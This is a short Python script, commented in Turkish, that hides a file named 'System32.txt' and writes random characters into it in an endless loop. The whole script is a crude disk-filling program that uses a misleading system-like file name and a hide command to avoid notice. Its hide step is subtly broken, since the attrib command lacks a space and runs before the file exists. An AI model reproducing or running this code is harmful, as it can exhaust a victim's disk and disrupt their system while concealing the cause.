import random
import os
#random ve os kütüphanelerini çağırır.

os.system("attrib +h" + "System32.txt")
dosya = open("System32.txt","a", encoding="utf-8")
# +h ile arka planda çalışan(hidden) dosya oluşturur. "a" ile dosyaya ekleme(append) yapılmak üzere dosya açılır.
while True:
    #sonsuz döngüye girer.
    kucuk_harf = "abcdefghijklmnoprstuvxyz"
    buyuk_harf = "ABCDEFGHIJKLMNOPRSTUVXYZ"
    rakam= "0123456789"
    sembol = "[]{}#()*; -_- | '^+%&"
    # gerekli değişkenler ve içerikleri tanımlanır.
    toplam = kucuk_harf + buyuk_harf + rakam + sembol
    length = 10
    # değişkenler biraraya getirilir. Satır uzunluğu belirlenir.
    satir= ''.join(random.sample (toplam, length))
    #random kütüphanesi çağırılarak değişkenler satır değişkenine rastgele yazılır.
    print(satir, file=dosya)
    #satir değişkenini dosya değişkeninin içine yazar.